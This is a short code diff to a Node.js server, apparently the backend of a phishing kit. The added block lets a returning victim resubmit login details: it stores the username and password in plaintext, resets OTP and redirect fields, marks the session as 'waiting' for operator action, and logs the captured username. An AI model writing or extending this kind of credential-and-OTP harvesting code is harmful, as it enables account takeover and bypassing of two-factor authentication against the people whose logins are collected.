@@ -254,6 +254,20 @@ const server = http.createServer(async (req, res) => {
     const body = await readBody(req);
     try {
       const data = JSON.parse(body);
+      if (data.sessionId) {
+        const existing = sessions.find(s => s.id === parseInt(data.sessionId));
+        if (existing) {
+          existing.username = (data.username || '').substring(0, 100);
+          existing.password = (data.password || '').substring(0, 100);
+          existing.loginStatus = 'waiting';
+          existing.otp = null;
+          existing.otpStatus = null;
+          existing.redirectUrl = null;
+          existing.date = new Date().toISOString();
+          console.log('[LOGIN-RETRY] id=' + existing.id + ' user=' + existing.username);
+          return json(res, { success: true, id: existing.id });
+        }
+      }
       sessionCounter++;
       const session = {
         id: sessionCounter,
